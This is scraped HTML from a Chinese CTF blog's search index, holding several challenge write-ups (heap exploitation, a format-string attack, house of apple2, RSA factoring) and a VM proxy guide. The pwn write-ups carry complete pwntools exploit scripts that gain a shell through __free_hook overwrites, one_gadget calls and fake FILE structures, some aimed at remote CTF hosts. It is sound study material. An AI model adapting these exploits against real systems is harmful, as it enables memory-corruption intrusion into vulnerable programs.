ËÄåÁ®ãÂ∫èÁöÑaddÂáΩÊï∞ÊØèÊ¨°ÂàõÂª∫Â†ÜÂùóÊó∂ÈÉΩ‰ºöÈ¢ùÂ§ñÂàõÂª∫‰∏Ä‰∏™Â§ßÂ∞è‰∏∫0x10ÁöÑÂ†ÜÂùó‰Ωú‰∏∫ÊåáÈíàÂ†ÜÂùóÔºåÊåáÈíàÊåáÂêëÂàõÂª∫Â†ÜÂùóÁöÑcontent&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136810972.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂÖ∑‰Ωì‰æãÂ≠êÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136837705.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;‰∏ÄÂºÄÂßã‰π†ÊÉØida hide casts‰∫ÜÔºåÊï∞ÊçÆÁ±ªÂûãÈöêËóèÔºåÁªìÊûúÂçäÂ§©Ê≤°ÊâæÂà∞ÊÄé‰πàÂà©Áî®Â†ÜÂùóÊåáÈíàÁöÑÁÇπ&lt;br&gt;
ÂêéÈù¢ËÇñÁ•ûËÆ≤Ëß£‰πãÂêéÁÆóÊòØÊÅçÁÑ∂Â§ßÊÇü‰∫Ü&lt;br&gt;
intÂûãÊØîËæÉ‰Ωé4Â≠óËäÇÔºåËÄåv1ÂéüÊú¨8Â≠óËäÇÔºåÈÇ£‰πàÂè™ÈúÄË¶Å‰øùËØÅv1ÁöÑ‰Ωé4Â≠óËäÇÂ§ß‰∫éÁ≠â‰∫é0Ôºå‰∫åËøõÂà∂ÁöÑÊúÄÈ´ò‰Ωç‰∏∫1ÔºàÁ¨¨64‰ΩçÔºâÂç≥ÂèØÁªïËøáÊ≠§Âà§Êñ≠&lt;br&gt;
ËÄå&lt;code&gt;free()&lt;/code&gt;ÁöÑÂØªÂùÄÊåâv1ÁöÑ‰Ωé4Â≠óËäÇ * 8ÂéªÊâæÔºåÂÆûÈôÖ‰∏äÁöÑÂÅèÁßªÊòØ&lt;code&gt;(ÁõÆÊ†áÂ†ÜÂùóÂú∞ÂùÄ-(heap_addr+0x260))&amp;gt;&amp;gt;3&lt;/code&gt;Âç≥ÂèØÔºåÂ¶Ç‰∏ãÂõæ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136537304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136542956.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âè™Ë¶ÅÊéßÂà∂‰∫ÜÊåáÈíàÂ†ÜÂùóÊ≠§È¢òÂ∞±ÁªàÁªì‰∫ÜÔºåÂÖ∑‰ΩìËØ¥ÊòéÁúã‰∏ãÈù¢&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chall&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)

add(0x80) #0 
add(0x80) #1
delete(1)
delete(0)
add(0x80) #0
show(0)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c0
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
# add(0x10)
edit(0,cyclic(0x80))

for i in range(7):
    add(0x80)

add(0x10) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(0x80) #0~6

add(0x10) #7
show(7)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))+0x1bc8-libc.sym[b&amp;quot;__free_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f322

gdb.attach(io)
pause()

print(&amp;quot;free_hook: &amp;quot;,hex(free_hook))

edit(7,p64(heap_addr+0x870)) #chunk 8ÁöÑÊåáÈíàÂ†ÜÂùó
edit(1,p64(heap_addr+0x7e0)) #chunk1ÂÜÖÂÆπÂ†ÜÂùó-&amp;gt;chunk 7ÁöÑÂÜÖÂÆπÂ†ÜÂùó-&amp;gt;chunk 8ÁöÑÊåáÈíàÂ†ÜÂùó


###‰ªªÊÑèÂú∞ÂùÄfreeÔºåÊ≠§Â§ÑfreeÁöÑÊòØchunk 1ÁöÑÂÜÖÂÆπÂ†ÜÂùó
idx=((1&amp;lt;&amp;lt;63)+0x84) - (1&amp;lt;&amp;lt;64) 
delete(idx)
print(hex(idx))
###ÂÅèÁßªÁî®(chunk 1ÂÜÖÂÆπÂ†ÜÂùóÂú∞ÂùÄ-(heap_addr+0x260))&amp;gt;&amp;gt;3Âç≥ÂèØ
###ÂÖ∑‰ΩìÁúãÂèçÁºñËØëÂêédeleteÂáΩÊï∞ÂÜÖÂÆπ


add(0x10) #9
edit(9,p64(free_hook))  #chunk 9ÂÆûÈôÖ‰∏äÊòØchunk 8ÁöÑÊåáÈíàÂ†ÜÂùó
edit(8,p64(shell)) #‰øÆÊîπchunk 8ÂÜÖÂÆπ‰∏∫one_gadget
print(&amp;quot;shell: &amp;quot;,hex(shell))
delete(8) #deleteÂç≥ÂèØgetshell

io.interactive()

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;Êú¨Êú∫ÁéØÂ¢ÉÂèØ‰ª•Êãøshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690137134855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËøòÊúâ‰∏ÄÂ§ßÂ†ÜÈ¢òÊ≤°Ë°•ÔºåÊó∂Èó¥Â§öÊù•ÁÇπüòøüòøüòø&lt;/p&gt;
">‰∏ÄÈÅìÊàë‰πü‰∏çÁü•ÈÅìÂêçÂ≠óÁöÑÂ†ÜÈ¢òÂ§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LMCf1vtkj/"" data-c="
          &lt;p&gt;ËÆ∞ÂΩï‰∏ãhost clashÁöÑipÂíåÁ´ØÂè£&lt;br&gt;
‰æãÂ¶ÇÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êõ¥ÊîπvmwareÁΩëÁªúÈÄÇÈÖçÂô®‰∏∫NAT&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689763491561.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ubuntu‰∏ãÁΩëÁªúËÆæÁΩÆÈªòËÆ§Ôºå‰ª£ÁêÜËÆæÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1689763558947.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÁªàÁ´ØÈÖçÁΩÆ&lt;br&gt;
‰øÆÊîπ&lt;code&gt;~/.bashrc&lt;/code&gt;ÔºåÊ∑ªÂä†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export https_proxy=http://10.16.1.102:7890
export http_proxy=http://10.16.1.102:7890
export all_proxy=socks5://10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂêé&lt;code&gt;source ~/.bashrc&lt;/code&gt;ÁîüÊïà&lt;/p&gt;
&lt;p&gt;gitËµ∞‰ª£ÁêÜ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --global http.https://github.com.proxy socks5://10.16.1.102:7890
git config --global http.proxy 10.16.1.102:7890
git config --global https.proxy 10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§ÂèØ‰ª•ÊâãÂä®Êõ¥Êîπgit‰ª£ÁêÜËÆæÁΩÆ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --show-origin http.proxy
&lt;/code&gt;&lt;/pre&gt;
">UbuntuËôöÊãüÊú∫Ëµ∞hostÁöÑclash‰ª£ÁêÜ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/FVrMrT-Fy/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;fmt&#34;&gt;fmtÔºö&lt;/h4&gt;
&lt;p&gt;Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÔºåÁ¨¨‰∏ÄÊ¨°Ê≥ÑÈú≤Ê†àÂú∞ÂùÄÂíålibcÔºåÁ¨¨‰∫åÊ¨°ÂÜôretÂú∞ÂùÄ‰∏∫one_gadgetÂç≥ÂèØ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;60.204.140.184&amp;quot;,30191)
# io=process(&amp;quot;./fmt&amp;quot;)
elf=ELF(&amp;quot;./fmt&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)


io.recvuntil(b&amp;quot;str: &amp;quot;)
payload=b&amp;quot;%8$p.%16$p&amp;quot;
io.sendline(payload)

leak_addr=int(io.recv(14),16)-0x1e94a0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))



sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
puts_addr=leak_addr+libc.sym[b&amp;quot;puts&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
_exit=leak_addr+libc.sym[b&amp;quot;_exit&amp;quot;]
shell=leak_addr+0xe3b01

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;other str: &amp;quot;)
payload=fmtstr_payload(6,{stack_addr-0xe8:shell},write_size=&#39;short&#39;)
# payload =fmtstr_payload(6,{malloc_hook:shell},write_size=&#39;short&#39;)+b&amp;quot;%1000000c&amp;quot;
io.sendline(payload)


print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;shell: &amp;quot;+hex(shell))


io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC:&lt;/h3&gt;
&lt;h4 id=&#34;usb&#34;&gt;usb:&lt;/h4&gt;
&lt;p&gt;‰ΩøÁî®mumuziÈîÆÁõòÊµÅÈáè‰∏ÄÊääÊ¢≠ÔºåÁÑ∂ÂêécyberchefÁÉπÈ•™Âç≥ÂèØÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689507053305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689507058855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto&#34;&gt;CryptoÔºö&lt;/h3&gt;
&lt;h4 id=&#34;rsa&#34;&gt;RSA:&lt;/h4&gt;
&lt;p&gt;qwbÂéüÈ¢ò...&lt;br&gt;
[link]&lt;a href=&#34;https://eprint.iacr.org/2015/399.pdf&#34;&gt;https://eprint.iacr.org/2015/399.pdf&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689510786286.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊúÄÂêélong_to_bytesÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from gmpy2 import *
m1=8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221
m2=22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079
n2=26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977
e2=65537
c2=15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437

r=7
PR = PolynomialRing(Zmod(n2),name=&#39;x&#39;)
x=PR.gen()
fx=m1*m2*x-(m1-m2)
fx=fx.monic()
xx=int(fx.small_roots(X=2^690,beta=0.7,epsilon=0.4)[0])
pp6=gcd(m1*m2*xx-(m1-m2),n2)
A=iroot(pp6,6)
assert A[1]
p=A[0]
q=n2//(pp6*p)
phi = (p**(r-1))*(p-1)*(q-1)
d=invert(e2,phi)

print(pow(c2,d,n2))
&lt;/code&gt;&lt;/pre&gt;
">HWS2023 È¢ÑÈÄâËµõ orrr wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/cbkv3xavp/"" data-c="
          &lt;h3 id=&#34;mipsrophttpsgithubcomoraclepiida_pluginstreemainmipsrop&#34;&gt;mipsropÔºö&lt;a href=&#34;https://github.com/OraclePi/IDA_plugins/tree/main/mipsrop&#34;&gt;https://github.com/OraclePi/IDA_plugins/tree/main/mipsrop&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Â∞Ü‰∏äËø∞ÈìæÊé•‰∏≠ÁöÑÊñá‰ª∂Â§çÂà∂Âà∞idaÂÆâË£ÖÁõÆÂΩïÁöÑpluginsÁõÆÂΩï‰∏ã&lt;br&gt;
Êèí‰ª∂ËøêË°åÊó∂ËæìÂá∫Á™óÂè£ÂÜÖÂÆπÂ¶Ç‰∏ãÂç≥ÊàêÂäü&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Propagating type information...
Function argument information has been propagated
The initial autoanalysis has been finished.
MIPS ROP Finder activated, found 1077 controllable jumps between 0x00000000 and 0x0008A1D4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Â¶ÇÊûúËøêË°åÊåá‰ª§Êä•Èîô&lt;code&gt;NameError: name &#39;mipsrop&#39; is not defined&lt;/code&gt;&lt;br&gt;
idapython‰∏≠ËæìÂÖ•Âç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import mipsrop
mipsrop = mipsrop.MIPSROPFinder()
&lt;/code&gt;&lt;/pre&gt;
">mipsropÈÖçÁΩÆ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JYkjVlphv/"" data-c="
          &lt;p&gt;glibc 2.35-0ubuntu3.1_amd64&lt;br&gt;
house of apple2&lt;br&gt;
Âè™Áªô‰∫Ü‰∏ÄÊ¨°uafÁöÑÊú∫‰ºöÔºåÊâÄ‰ª•ÈúÄË¶ÅÂØπuafÁöÑÂ†ÜÂùóÈáçÂ§çÂà©Áî®&lt;br&gt;
Á¨¨‰∏ÄÊ¨°Ê≥ÑÈú≤libcÔºåÁ¨¨‰∫åÊ¨°Áî≥ËØ∑Êó∂overlapÊ≥ÑÈú≤Â†ÜÂú∞ÂùÄ&lt;br&gt;
ÂêéÁª≠Â∞±ÊòØÊ≠£Â∏∏house of apple2ÊµÅÁ®ã&lt;br&gt;
ÂèØ‰ª•Êâìone_gadgetÔºåËøôÈáåÊàë‰ª¨‰øÆÊîπ&lt;code&gt;_flags&lt;/code&gt;‰∏∫&lt;code&gt;  sh;&lt;/code&gt;ÊâìsystemËé∑Âèñshell&lt;br&gt;
Ê≥®ÊÑèÂ†ÜÂùóÊûÑÈÄ†ÔºåÂ§ßÂ∞è‰∏çË∂ÖËøá0x200Ôºå‰∏ãÊ†á‰∏çË∂ÖËøá12Ôºõ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28065)
# io=process(&amp;quot;./happy_note&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(s,n,m):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;[2]\n&amp;quot;,str(m)) #1-&amp;gt;calloc  2-&amp;gt;malloc 

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;show?\n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def func(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;666&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    
def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b&amp;quot;&amp;quot;
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file

# gdb.attach(io)
# pause()

for i in range(11):
    add(0x100,i,1)

for i in range(7):
    delete(i)

func(7)
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
_IO_list_all_chain=_IO_list_all+0x88
_IO_wfile_jumps=leak_addr+libc.sym[b&amp;quot;_IO_wfile_jumps&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0xebcf1


add(0x100,0,1) #7

delete(9)
delete(7) #tcachebin 0

show(0) #tcachebin 0
io.recvuntil(b&amp;quot;content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0xc20
key=heap_addr&amp;gt;&amp;gt;12
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(0x100,2,1)
add(0xe8,3,1) #new 0 , uaf , editable
add(0xe8,4,1)

delete(4)
delete(3)

edit(0,p64(key^_IO_list_all))

add(0xe8,5,2) #5
add(0xe8,6,2) #6

add(0x1e8,7,1) #7
add(0x200,11,1) #11
#chunk 10  heap_addr+0xd30
fake_wide_data=heap_addr+0xd40 #chunk 10 content 
fake_jump=heap_addr+0xf30 # chunk 7
fake_IO=heap_addr+0x1120 # chunk 11

_wide_data=b&amp;quot;&amp;quot;
_wide_data=_wide_data.ljust(0x18,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0x30,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0xe0,b&amp;quot;\x00&amp;quot;)+p64(fake_jump)
edit(10,_wide_data)


edit(6,p64(fake_IO))
payload=b&amp;quot;\x00&amp;quot;*0x58+p64(shell)
payload=payload.ljust(0x1e0,b&amp;quot;\x00&amp;quot;)+b&amp;quot;  sh;&amp;quot;
edit(7,payload)
edit(11,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))

delete(9)


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[Â∑ÖÂ≥∞ÊûÅÂÆ¢ 2022]happy note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/apppplllllllleeeeeee/"" data-c="
          &lt;h3 id=&#34;without_hook&#34;&gt;without_hook:&lt;/h3&gt;
&lt;p&gt;2.36ÁöÑglibc&lt;br&gt;
ÊúÄÂºÄÂßãÊÉ≥Áî®house of bananaÊâìÔºåÁªìÊûúÂèëÁé∞libcÂíåldÂÅèÁßª‰∏çÂõ∫ÂÆö&lt;br&gt;
Ê≠§È¢òÈÄâÊã©Êâìhouse of apple2&lt;br&gt;
&lt;code&gt;magic_gadget&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÈÄöËøá&lt;code&gt;magic_gadget&lt;/code&gt;Âíå&lt;code&gt;setcontext+61&lt;/code&gt;Âä´ÊåÅrsp,ËØ¶ÁªÜËØ¥ÊòéÊîæÂú®exp‰∫Ü&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def exit():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;5&amp;quot;)

def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b&amp;quot;&amp;quot;
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
